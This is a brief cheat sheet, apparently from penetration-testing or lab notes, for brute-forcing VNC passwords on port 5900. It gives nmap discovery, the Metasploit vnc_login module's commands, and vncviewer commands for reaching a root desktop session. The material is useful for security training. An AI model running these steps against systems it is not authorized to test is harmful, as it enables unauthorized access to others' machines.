# VNC Brute-Force (Port 5900)

VNC provides remote graphical desktop access, and authentication relies solely on a password — no username is required. This makes it a direct target for brute-force attacks, especially since Metasploit's `vnc_login` module uses its own built-in password list by default. A successful login grants access not just to a terminal, but to the target's **full graphical desktop**.

## Discovery

| Command | Description |
|---|---|
| `nmap -A -p- -T5 [target IP]` | Detects VNC (port 5900) as open |

## Attack

| Command | Description |
|---|---|
| `msfconsole` | Launches the Metasploit console |
| `search vnc` | Searches for VNC-related modules |
| `use auxiliary/scanner/vnc/vnc_login` | Selects the VNC authentication scanner module |
| `show options` | Displays required parameters — unlike SSH, VNC authentication uses only a password, with no username field |
| `set rhosts [target IP]` | Sets the target IP |
| `exploit` | Launches the attack; if `PASS_FILE` isn't specified, the module automatically uses Metasploit's built-in VNC password list |

## Verification

| Command | Description |
|---|---|
| `vncviewer [target IP]` | Run in a separate terminal tab after a password is found — connects to the target with the recovered password, opening a full graphical desktop session |
| `whoami` | Confirms which user account was accessed (run from a terminal inside the VNC desktop) — in this case, `root` |
| `uname -a` | Displays the target system's kernel information |
| `ls` | Confirms file access within the desktop session |

## Difference from SSH

- SSH requires a username + password pair; VNC only needs a password
- SSH opens a terminal/shell; VNC provides full graphical desktop access
